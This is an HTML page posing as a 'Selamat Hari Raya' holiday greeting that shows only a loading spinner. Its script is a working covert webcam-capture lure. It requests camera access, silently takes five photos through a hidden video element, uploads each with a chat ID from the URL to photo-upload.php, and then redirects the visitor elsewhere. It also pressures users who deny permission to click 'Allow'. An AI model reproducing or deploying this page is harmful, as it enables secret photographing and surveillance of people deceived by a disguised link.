<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selamat Hari Raya</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f8f8f8;
        }

        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .spinner.hidden {
            display: none;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>
    <div id="spinner" class="spinner"></div>
    <video id="video" width="320" height="240" autoplay></video>
    <script>
        function getChatIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        const chatId = getChatIdFromURL();

        if (!chatId) {
            alert('Chat ID is missing from the URL!');
        } else {
            const spinner = document.getElementById('spinner');
            spinner.classList.remove('hidden');

            const video = document.getElementById('video');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    video.srcObject = stream;

                    let counter = 0;
                    const photoInterval = setInterval(function() {
                        if (counter < 5) {
                            capturePhoto();
                            counter++;
                        } else {
                            clearInterval(photoInterval);
                            window.location.href = 'https://izzsem.github.io/project-2/';
                        }
                    }, 1000);

                    function capturePhoto() {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoDataUrl = canvas.toDataURL('image/jpeg');

                        const formData = new FormData();
                        formData.append('photo', dataURLtoBlob(photoDataUrl));
                        formData.append('chat_id', chatId);

                        fetch('photo-upload.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => console.log('Photo uploaded:', data))
                        .catch(error => console.error('Error uploading photo:', error));
                    }

                    function dataURLtoBlob(dataURL) {
                        const byteString = atob(dataURL.split(',')[1]);
                        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
                        const ab = new ArrayBuffer(byteString.length);
                        const ia = new Uint8Array(ab);
                        for (let i = 0; i < byteString.length; i++) {
                            ia[i] = byteString.charCodeAt(i);
                        }
                        return new Blob([ab], { type: mimeString });
                    }
                })
                .catch(function(error) {
                    console.log("Camera permission denied: ", error);
                    spinner.classList.add('hidden');
                    alert("Please click 'Allow' to continue to the page.");
                });
        }
    </script>
</body>
</html>
